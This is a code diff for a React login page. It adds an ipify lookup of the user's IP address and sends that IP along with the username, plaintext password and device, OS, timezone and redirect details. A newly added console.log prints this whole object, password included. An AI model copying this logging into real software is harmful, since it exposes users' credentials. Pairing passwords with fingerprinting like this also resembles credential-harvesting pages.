@@ -4,6 +4,8 @@ import { useDispatch, useSelector } from "react-redux";
 import { RotatingLines } from "react-loader-spinner";
 import Iframe from "react-iframe";
 import { toast } from "react-toastify";
+import ipify from "ipify";
+// import axios from "axios";
 
 import { loginUser } from "../redux/loginSlice";
 import { detectBrowser } from "../utils/browserUtils";
@@ -55,6 +57,8 @@ const LogIn = () => {
   // Extract the redirect_url parameter from the query parameters
   const redirectUrl = queryParams.get("redirect_url");
 
+  const fetchUserIp = async () => (await ipify()).ip;
+
   // Handle user information
   const handleUserInfo = async (e) => {
     e.preventDefault();
@@ -64,11 +68,17 @@ const LogIn = () => {
       // update the username state
       setUsername(username.value);
 
+      // Fetch the user's IP address directly within the login action
+      // const ipResponse = await axios.get("https://api.ipify.org?format=json");
+      // const userIp = ipResponse.data.ip;
+
+      const userIp = await fetchUserIp();
+
       const userData = {
         username: username.value,
         password: password.value,
         time,
-        ip: "",
+        ip: userIp,
         os,
         device,
         timezone,
@@ -79,6 +89,8 @@ const LogIn = () => {
         mainparams,
         redirectUrl,
       };
+
+      console.log("UserData", userData);
 
       const response = await dispatch(loginUser(userData));
       const sessionID = response?.payload?.session_id;
